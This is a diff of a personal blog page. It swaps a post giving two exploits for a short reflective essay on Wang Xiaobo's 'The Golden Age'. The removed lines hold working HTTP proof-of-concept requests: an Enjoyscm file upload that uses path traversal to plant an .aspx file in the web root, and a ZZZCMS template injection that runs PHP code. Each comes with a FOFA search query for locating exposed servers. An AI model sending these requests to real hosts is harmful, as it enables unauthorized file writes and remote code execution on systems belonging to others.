@@ -10,18 +10,18 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2023/03/14/test/"/>
+    <link rel="canonical" href="http://example.com/2023/03/14/suibi/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     <meta property="og:type" content="article">
-    <meta property="og:title" content="1Day利用 Enjoyscm &amp; ZZCMS未公布漏洞">
+    <meta property="og:title" content="王小波的《黄金时代》">
     <meta property="og:description" content="IcMl0x824">
-    <meta property="og:url" content="http://example.com2023/03/14/test/">
+    <meta property="og:url" content="http://example.com2023/03/14/suibi/">
     
     <meta property="og:site_name" content="IcMl0x824 &#39;s Blog">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="1Day利用 Enjoyscm &amp; ZZCMS未公布漏洞">
+    <meta name="twitter:title" content="王小波的《黄金时代》">
     <meta name="twitter:description" content="IcMl0x824">
     <meta name="twitter:image" content="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png">
     <!--- Icon Part-->
@@ -32,7 +32,7 @@
     
     <title>
         
-            1Day利用 Enjoyscm &amp; ZZCMS未公布漏洞 -
+            王小波的《黄金时代》 -
         
         IcMl0x824 &#39;s Blog
     </title>
@@ -212,8 +212,8 @@
             
                       
                 <div class="article-title">
-                    <img src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041430302.png" alt="1Day利用 Enjoyscm &amp; ZZCMS未公布漏洞" />
-                    <h1 class="article-title-cover">1Day利用 Enjoyscm &amp; ZZCMS未公布漏洞</h1>
+                    <img src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303142335691.jpeg" alt="王小波的《黄金时代》" />
+                    <h1 class="article-title-cover">王小波的《黄金时代》</h1>
                 </div>
             
                 
@@ -235,15 +235,15 @@
                             <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="pc">2023-03-14 17:42:19</span>
-        <span class="mobile">2023-03-14 17:42</span>
+        <span class="pc">2023-03-14 23:30:53</span>
+        <span class="mobile">2023-03-14 23:30</span>
         <span class="hover-info">创建</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="pc">2023-03-14 21:32:58</span>
-            <span class="mobile">2023-03-14 21:32</span>
+            <span class="pc">2023-03-14 23:38:33</span>
+            <span class="mobile">2023-03-14 23:38</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -267,12 +267,16 @@
             
 
             <div class="article-content markdown-body">
-                <h2 id="Enjoyscm-UploadFile任意文件上传漏洞"><a href="#Enjoyscm-UploadFile任意文件上传漏洞" class="headerlink" title="Enjoyscm UploadFile任意文件上传漏洞"></a>Enjoyscm UploadFile任意文件上传漏洞</h2><h3 id="fofa：title-x3D-”供应商网上服务厅”"><a href="#fofa：title-x3D-”供应商网上服务厅”" class="headerlink" title="fofa：title&#x3D;”供应商网上服务厅”"></a>fofa：title&#x3D;”供应商网上服务厅”</h3><p>执行如下POC上传hello.aspx，内容为hello enjoyscm，访问根目录的hello.aspx即可得到内容。 </p>
-<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /File/UploadFile HTTP/1.1 </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&#123;&#123;Hostname&#125;&#125; </span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0 </span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01 </span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 </span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest </span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------21909179191068471382830692394 </span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>460 </span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close </span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span> </span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty </span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors </span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin </span><br><span class="line"></span><br><span class="line">-----------------------------21909179191068471382830692394 </span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;../../../hello.aspx&quot; </span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg </span><br><span class="line"></span><br><span class="line">hello enjoyscm </span><br><span class="line">-----------------------------21909179191068471382830692394 </span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;action&quot; </span><br><span class="line"></span><br><span class="line">unloadfile </span><br><span class="line">-----------------------------21909179191068471382830692394 </span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;filepath&quot; </span><br><span class="line"></span><br><span class="line">-----------------------------21909179191068471382830692394</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="ZZZCMS-parserSearch-远程命令执行漏洞"><a href="#ZZZCMS-parserSearch-远程命令执行漏洞" class="headerlink" title="ZZZCMS parserSearch 远程命令执行漏洞"></a>ZZZCMS parserSearch 远程命令执行漏洞</h2><h3 id="fofa：app-x3D-”zzzcms”"><a href="#fofa：app-x3D-”zzzcms”" class="headerlink" title="fofa：app&#x3D;”zzzcms”"></a>fofa：app&#x3D;”zzzcms”</h3><p>执行如下POC可执行phpinfo命令</p>
-<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?location=search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&#123;&#123;Hostname&#125;&#125;</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,`image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=rbuhrqqhoctntnak8slkascqp1; keys=%7Bif%3A%3DPHPINFO%28%29%7D%7Bend+if%7D%0D%0A</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">keys=</span><span class="template-variable">&#123;<span class="keyword">if</span>:=PHPINFO()&#125;</span><span class="template-variable">&#123;end <span class="keyword">if</span>&#125;</span></span></span><br></pre></td></tr></table></figure></div>
-
+                <h2 id="王小波的《黄金时代》和我的痛苦岁月下的懦弱三观"><a href="#王小波的《黄金时代》和我的痛苦岁月下的懦弱三观" class="headerlink" title="王小波的《黄金时代》和我的痛苦岁月下的懦弱三观"></a>王小波的《黄金时代》和我的痛苦岁月下的懦弱三观</h2><blockquote>
+<p>“那一天我二十一岁，在我一生的黄金时代，我有好多奢望。我想爱，想吃，还想在一瞬间变成天上半明半暗的云。后来我才知道，生活就是个缓慢受锤的过程，人一天天老下去，奢望也一天天消失，最后变得像挨了锤的牛一样。可是我过二十一岁生日时没有预见到这一点。我觉得自己会永远生猛下去，什么也锤不了我。”</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303142335691.jpeg"
+                     
+                ></p>
+<p>对我来讲，我常常受够了这身边的一起，我感到痛苦，我感到无时无刻没有再为自己而活，充斥着被别人支配情感的恐惧，我想讲理，我想拿着我的理论和三观去说服别人，我做不到，我只能像风一样，等忍受不住就偷偷的离开，我想我已经很累了，实在是获得单纯而少点思考，真的很难。</p>
 
             </div>
 
@@ -280,11 +284,11 @@
                 <div class="post-copyright-info">
                     <div class="article-copyright-info-container">
     <ul>
-        <li>本文标题：1Day利用 Enjoyscm &amp; ZZCMS未公布漏洞</li>
+        <li>本文标题：王小波的《黄金时代》</li>
         <li>本文作者：IcMl0x824</li>
-        <li>创建时间：2023-03-14 17:42:19</li>
+        <li>创建时间：2023-03-14 23:30:53</li>
         <li>
-            本文链接：https://icml8.github.io/2023/03/14/test/
+            本文链接：https://icml8.github.io/2023/03/14/suibi/
         </li>
         <li>
             版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -302,21 +306,21 @@
             
                 <div class="article-nav">
                     
-                        <div class="article-prev">
-                            <a class="prev"
-                            rel="prev"
-                            href="/2023/03/14/CHATGPT/"
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/03/14/pearcmd/"
                             >
-                                <span class="left arrow-icon flex-center">
-                                    <i class="fa-solid fa-chevron-left"></i>
-                                </span>
                                 <span class="title flex-center">
-                                    <span class="post-nav-title-item">遗失的火种&amp;被缚的普罗米修斯&amp;我们是来埋葬ChatGPT的，而不是来赞美它的</span>
-                                    <span class="post-nav-item">上一篇</span>
+                                    <span class="post-nav-title-item">从[HXBCTF 2021]湖湘杯easywill-1看如何利用pearcmd.php从LFI到Getshell再到LFI文件不落地RCE的学习</span>
+                                    <span class="post-nav-item">下一篇</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
                                 </span>
                             </a>
                         </div>
-                    
                     
                 </div>
             
@@ -330,8 +334,8 @@
                 <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">此页目录</div>
-        <div class="page-title">1Day利用 Enjoyscm &amp; ZZCMS未公布漏洞</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enjoyscm-UploadFile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">Enjoyscm UploadFile任意文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fofa%EF%BC%9Atitle-x3D-%E2%80%9D%E4%BE%9B%E5%BA%94%E5%95%86%E7%BD%91%E4%B8%8A%E6%9C%8D%E5%8A%A1%E5%8E%85%E2%80%9D"><span class="nav-number">1.1.</span> <span class="nav-text">fofa：title&#x3D;”供应商网上服务厅”</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ZZZCMS-parserSearch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">ZZZCMS parserSearch 远程命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fofa%EF%BC%9Aapp-x3D-%E2%80%9Dzzzcms%E2%80%9D"><span class="nav-number">2.1.</span> <span class="nav-text">fofa：app&#x3D;”zzzcms”</span></a></li></ol></li></ol>
+        <div class="page-title">王小波的《黄金时代》</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%8B%E5%B0%8F%E6%B3%A2%E7%9A%84%E3%80%8A%E9%BB%84%E9%87%91%E6%97%B6%E4%BB%A3%E3%80%8B%E5%92%8C%E6%88%91%E7%9A%84%E7%97%9B%E8%8B%A6%E5%B2%81%E6%9C%88%E4%B8%8B%E7%9A%84%E6%87%A6%E5%BC%B1%E4%B8%89%E8%A7%82"><span class="nav-number">1.</span> <span class="nav-text">王小波的《黄金时代》和我的痛苦岁月下的懦弱三观</span></a></li></ol>
 
     </div>
 </div>
